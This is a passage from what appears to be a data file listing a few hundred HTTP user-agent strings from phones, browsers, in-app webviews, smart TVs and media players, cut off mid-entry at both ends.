(KHTML, like Gecko) Chrome/98.0.4758.87 Safari/537.36","Mozilla/5.0 (Linux; Android 11; SM-A205W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36 (Ecosia android@88.0.4324.181)","Mozilla/5.0 (Linux; Android 7.0; ZTE BLADE V0850) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-J530F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]","Mozilla/5.0 (Linux; Android 10; SM-N960F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; HTC One A9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-J600G Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.87 Mobile Safari/537.36 UOH/v1.6_269-android","Mozilla/5.0 (Linux; 10; MAR-LX1H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36","foobar2000/1.6.10b2","Mozilla/5.0 (Linux; U; Android 10; pt-pt; Redmi 7A Build/QKQ1.191014.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.18.3-gn","Mozilla/5.0 (Linux; Android 11; SM-G780F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.70 Mobile Safari/537.36 UCURSOS/v1.6_269-android","Mozilla/5.0 (Linux; Android 6.0.1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile DuckDuckGo/5 Safari/537.36","Samsung SM-C105 stagefright/1.2 (Linux;Android 4.4.2)","Mozilla/5.0 (Linux; arm_64; Android 10; MI 9 SE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaApp_Android/21.114.1 YaSearchBrowser/21.114.1 BroPP/1.0 SA/3 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; SM-T225 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","FBAN/FB4A;FBAV/352.0.0.21.117;FBBV/348184966;FBDM/(density=1.8000001,]","Mozilla/5.0 (Linux; Android 11; SM-G9910 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]","Mozilla/5.0 (Linux; Android 9; SM-A207F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 11; moto g power (2022) Build/RRQS31.Q3-68-23-1-3)","Mozilla/5.0 (Linux; Android 11; SM-G9910 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 12_5_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16H62 [FBAN/FBIOS;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/12.5.5;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5]","Mozilla/5.0 (iPhone; CPU iPhone OS 15_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 220.0.0.8.117 (iPhone14,5; iOS 15_2_1; it_IT; it-IT; scale=3.00; 1170x2532; 347566818) NW/3","Mozilla/5.0 (Linux; Android 7.0; SM-A510F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; CPH2365) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 8.1.0; M7S_PLUS Build/V20_20210828)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; T95M-2G Build/LMY47V)","Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.1.2; AFTKMST12 Build/NS6286; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0","Mozilla/5.0 (Linux; Android 11; SM-A705F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux;) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36 SRAF/4.0 (; UMC-Sharp; FVP6586; v3.5; v1.0; ); CE-HTML/1.0 hbbtv PHILCO/PH60D16DSGWN4K DeviceID/c08acd72aef0 Arcelik Grundig FXM-U2FsdGVkX1/R4Mm5jirf/kxwXRs7NojK6LT1FkgypUQXe8BMvn/J3Y4Lb4jdHz6f-END","Mozilla/5.0 (Linux; Android 10; Pixel) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 6.0; P40 pro Build/MRA58K)","Mozilla/5.0 (Linux; Android 9; moto x4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; CPH2069 Build/QKQ1.200114.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/351.0.0.38.117;]","Mozilla/5.0 (Linux; Android 10; Mi MIX 3 Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 Replaio/2.9.4","Dalvik/2.1.0 (Linux; U; Android 12; SM-F711W Build/SP1A.210812.016)","Mozilla/5.0 (Linux; Android 10; Infinix X687 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.48 CitizenFX/1.0.0.5303 Safari/537.36","Mozilla/5.0 (Linux; Android 11; SM-A525F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; WP5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 9; fr-fr; Redmi Note 6 Pro Build/PKQ1.180904.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0-gn","Mozilla/5.0 (Linux; Android 10; M2003J15SC Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36 Edg/98.0.1108.43/EnIHObUE-47","Mozilla/5.0 (Linux; Android 8.1.0; vivo 1808 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.4.2; SENWA S605) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Dart/2.12 (dart:io), Mozilla/5.0 (Linux; Android 10; moto e(7) plus Build/QPZS30.30-Q3-38-69-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; SM-A202F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/314.1.0.45.119;]","Mozilla/5.0 (Linux; Android 9; SM-J415FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]","AppleCoreMedia/1.0.0.19E5209h (iPad; U; CPU OS 15_4 like Mac OS X; sl_si)","Mozilla/5.0 (QtEmbedded; Linux) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/48.0 Safari/537.4 HbbTV/1.5.1 (+DRM; TCL; RT51; V8-R851T02-LF1V388; RT51; com.tcl.RT51;) FVC/4.0 (TCL; com.tcl.RT51;)","Mozilla/5.0 (Linux; Android 10; Alba10Q Build/QP1A.191105.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) TopMediaTv/0.1.3 Chrome/94.0.4606.81 Electron/15.3.0 Safari/537.36","Mozilla/5.0 (Linux; Android 11; SM-A225M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Mobile Safari/537.36 EdgA/97.0.1072.78","Dalvik/2.1.0 (Linux; U; Android 6.0; A466BG Build/MRA58K)","Mozilla/5.0 (Linux; Android 5.1.1; KFDOWI Build/LVY48F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Safari/537.36 [FB_IAB/FB4A;FBAV/250.0.0.26.241;]","Dalvik/2.1.0 (Linux; U; Android 11; M2006C3LG Build/RP1A.200720.011)","iTunes/12.10.6 (Windows; Microsoft Windows 10 x64 Home Premium Edition (Build 19043); x64) AppleWebKit/7609.1020.4004.4","Mozilla/5.0 (Linux; U; Android 11; in-id; CPH1937 Build/RKQ1.200903.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/45.8.3.1","Dalvik/2.1.0 (Linux; U; Android 11; H96_Max_V11 Build/RQ2A.210505.003)","Mozilla/5.0 (Linux; Android 10; WP5 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36[MyView]","Mozilla/5.0 (Linux; Android 10; moto e(7) Build/QOFS30.569-36-10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/288.0.0.11.115;]","Mozilla/5.0 (Linux; Android 9; CPH1989) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; SM-A025G Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]","Mozilla/5.0 (Linux; Android 9; GM 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; SM-G960U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (QtEmbedded; Linux) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/48.0 Safari/537.4 HbbTV/1.4.1 (+DRM; TCL; RTK2841; V8-R41KT01-LF1V305; RTK2841; com.tcl.RTK2841;)","Mozilla/5.0 (Linux; Android 9; TA-1032 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.1.0; Z60s Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; Nokia 5.4 Build/RKQ1.210303.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/351.0.0.38.117;]","Mozilla/5.0 (Linux; Android 10; 9309X_EEA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36","Mozilla/5.0 (Linux; 7.0; BV6000S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 11; en-gb; Mi 10T Pro Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.18.3-gn","Mozilla/5.0 (Linux; Android 10; SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 10; STG H10 Build/QP1A.190711.020)","Mozilla/5.0 (Linux; Android 9; BND-L21) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36","iTunes/4.7.1 (Linux; N; Netgear RAIDiator; sparc-linux; DE; utf8) SqueezeCenter%2C Squeezebox Server%2C Logitech Media Server/7.7.5/1416570306","Mozilla/5.0 (Linux; Android 10; SM-A750F) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","iTunes/4.7.1 (Linux; N; Debian; x86_64-linux; EN; utf8) SqueezeCenter%2C Squeezebox Server%2C Logitech Media Server/8.2.0/1627922070","Mozilla/5.0 (Linux; Android 11; Redmi Note 8) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 12; SM-G973W Build/SP1A.210812.016)","Mozilla/5.0 (Linux; 10; SM-A107F) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (Linux; 11; NX666J) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SM-A725F) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML%2C like Gecko) Version/15.0 YaBrowser/20.12.0.1915.10 SA/3 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Linux; 8.1.0; BV5800_RU) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36","Mozilla/5.0 (Linux; 9; SM-J400F) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (Linux; 9; HRY-LX1) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (Linux; 10; vivo 1806) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.1.0; SM-T580) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/97.0.4692.98 Safari/537.36","Mozilla/5.0 (Linux; Android 9; LYA-L29) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; 4.4.2; Che2-L11) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/86.0.4240.75 Mobile Safari/537.36","Mozilla/5.0 (Linux; 8.1.0; SM-J710F) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (Linux; 8.1.0; BQ-5520L) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (Linux; 11; vivo 1906) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.4.2; Lenovo A536 Build/KOT49H) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/34.0.1847.131 YaBrowser/14.5.1847.18432.00 Mobile Safari/537.36","Mozilla/5.0 (Linux; 12; SM-G975F) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (Linux; 11; M2010J19SY) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (Linux; 10; ZQ8003) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (Linux; 7.0; JMM-L22) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-J400M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; 11; TECNO KF6m) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-T377W Build/MMB29K)","Mozilla/5.0 (Linux; 11; POCO F2 Pro) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; SM-T220) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/97.0.4692.98 Safari/537.36","Mozilla/5.0 (Linux; 7.1.1; Aquaris U Plus) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 9; ZB633KL Build/WW_Phone-201905221734)","Mozilla/5.0 (Linux; 8.1.0; Lenovo L38041) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/96.0.4664.174 YaBrowser/22.1.2.833 Yowser/2.5 Safari/537.36","whaale-st/81 CFNetwork/1325.0.1 Darwin/21.1.0","Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/98.0.4758.82 Safari/537.36","Mozilla/5.0 (Linux; 5.0.1; LG-H502) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.1.0; SM-G610M) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; SM-A315G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 10; M2007J17G MIUI/V12.0.6.0.QJSEUVF)","Mozilla/5.0 (Linux; Android 9; SM-J415G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; SM-J810M Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 UCURSOS/v1.6_269-android","Mozilla/5.0 (Linux; Android 8.0.0; WAS-LX3 Build/HUAWEIWAS-LX3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]","Dalvik/2.1.0 (Linux; U; Android 11; Nokia X100 Build/RKQ1.210528.001)","Mozilla/5.0 (Linux; Android 10; SM-A013M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/283.0.0.6.117;]","Mozilla/5.0 (Linux; Android 8.1.0; LM-Q710.FG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; RNE-L01 Build/HUAWEIRNE-L01; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/338.1.0.36.118;]","{Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/346.0.0.27.116;FBBV/348162750;FBDV/iPhone11,2;FBMD/iPhone;FBSN/iOS;FBSV/15.3;FBSS/3;FBCR/;FBID/phone;FBLC/it;FBOP/0]}","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Win64; x64; Trident/7.0; To","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; WOW64; Trident/7.0; Touch; .NET","Mozilla/5.0 (iPad; CPU OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari Line/12.0.1","Mozilla/5.0 (Linux; Android 11; CPH1979) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36 OPR/66.2.3445.62346","Mozilla/5.0 (Linux; Android 10; CPH2185 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]","Mozilla/5.0 (Linux; 8.1.0; X90) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 10; zh-CN; ASK-AL00x Build/HONORASK-AL00x) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.7.8.1159 Mobile Safari/537.36","Mozilla/5.0 (Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 OPR/46.0.2207.0 OMI/4.20.3.54.Catcher2.196 Model/Hisense-MSD6886 VIDAA/4.0(Hisense;SmartTV;HE43A6507EUWTS;mstar6886/V0000.01.00L.L1103;UHD)","Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 UCURSOS/v1.6_269-android","Mozilla/5.0 (Linux; Android 6.0; S10 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2010J19SY Build/QKQ1.200830.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; SM-M315F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]","Mozilla/5.0 (Linux; Android 11; T781 Build/RKQ1.210107.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 15_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/346.0.0.27.116;FBBV/348162750;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/15.2.1;FBSS/3;FBCR/;FBID/phone;FBLC/hu;FBOP/0]","Mozilla/5.0 (Linux; Android 12; SM-A528B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]","Dalvik/2.1.0 (Linux; U; Android 10; I4113 Build/53.1.A.3.34)","Mozilla/5.0 (Linux; Android 7.1.2; GI UNI2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Safari/537.36","Mozilla/5.0 (Linux; Android 10; SM-A202F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; A7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; SM-A750FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15 Cookie hA6S********************","Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D50 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/15.3;FBSS/2;FBID/phone;FBLC/en_GB;FBOP/5]","Mozilla/5.0 (iPhone; CPU iPhone OS 15_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,2;FBMD/iPhone;FBSN/iOS;FBSV/15.2.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5]","Mozilla/5.0 (Linux; Android 12; Pixel 3a XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; XQ-AD52) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; 8.1.0; Neffos_C7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (Linux; arm_64; Android 10; STK-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.174 YaApp_Android/22.13.1 YaSearchBrowser/22.13.1 BroPP/1.0 SA/3 Mobile Safari/537.36","Mozilla/5.0 (Linux; 6.0; Lenovo TAB 2 A10-70L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 12; T676K Build/SP1A.210812.016)","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.76 OpenWave/91.4.4273.74","Mozilla/5.0 (Linux; Android 11; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36 OPR/67.1.3508.63168","Mozilla/5.0 (Linux; Andr0id 9; BRAVIA 4K UR2 Build/PTT1.190515.001.S105) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36 OPR/46.0.2207.0 OMI/4.13.5.431.DIA5HBBTV.266 HbbTV/1.5.1 (+DRM; Sony; KD-65XG9505; PKG6.5076.0635EUA; ; com.sony.HE.G3.4K; )  LaTivu_1.0.1_2020","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0 LikeWise/98.6.2725.26","Mozilla/5.0 (Linux; Android 11; Infinix X657B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","WinampMPEG/5.11 (SSL Proxy for client IP: 37.160.30.152 / Country: IT)","Mozilla/5.0 (Linux; Android 12; SM-G991B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]","Dalvik/2.1.0 (Linux; U; Android 10; M2006C3MNG MIUI/V12.0.1.0.QCSEUOR)","Mozilla/5.0 (Linux; Android 7.1.1; SM-J510L Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 6.0; LG-H815) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; SM-A202F 